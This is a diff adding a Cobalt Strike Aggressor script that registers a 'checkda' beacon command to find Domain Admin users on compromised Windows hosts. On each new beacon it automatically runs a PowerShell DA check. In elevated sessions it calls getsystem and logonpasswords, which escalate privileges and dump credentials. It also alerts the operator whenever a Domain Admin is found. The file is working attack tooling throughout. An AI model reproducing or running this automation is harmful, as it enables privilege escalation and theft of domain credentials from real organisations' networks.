@@ -1,0 +1,49 @@
+ # quickly run powershellimport
+sub powershellimport {
+  bpowershell_import($1, script_resource("Invoke-DACheck.ps1"));
+}
+
+alias checkda {
+  powershellimport($1);
+  bpowershell($1, 'Invoke-DACheck');
+}
+
+# register the GetDa command
+beacon_command_register(
+  "checkda", 
+  "Checks if the current user is in the DA Group", 
+  "Synopsis: echo [no arguments]\n\nChecks using Powershell that supports (2.0 or later with 3.5 .NET) \n or (PS 4.0 or later) to perform Domain Group queries.");
+
+# set up the Initial check
+on beacon_initial {
+  powershellimport($1);
+  bpowershell($1, 'Invoke-DACheck -Initial True');
+  $a = binfo($1, "user");
+  $b = "*";
+  if ($b isin $a)
+    {
+    bgetsystem($1);
+    blogonpasswords($1);
+    }
+}
+
+
+#NEED TO SETUP A CHECK ARRAY FOR PAST DA FINDS
+# set up event consumer to search for specfic pattern
+# if found alert them via Elog and box
+on beacon_output {
+    $s = replace($2, 'received output:\n'.'');
+    # println($s);
+    $f = "[!] Found-DA-User:";
+    if ($f isin $s)
+      {
+      $pid = binfo($1, "pid");
+      elog("Found DA User at Pid: $pid");
+      show_message("Found DA User at Pid: $pid");
+      beacon_note($1, "DA User on this box");
+      }
+  }
+
+#  bpowershell($1, '$user = [Security.Principal.WindowsIdentity]::GetCurrent();(New-Object Security.Principal.
+#  WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)');
+
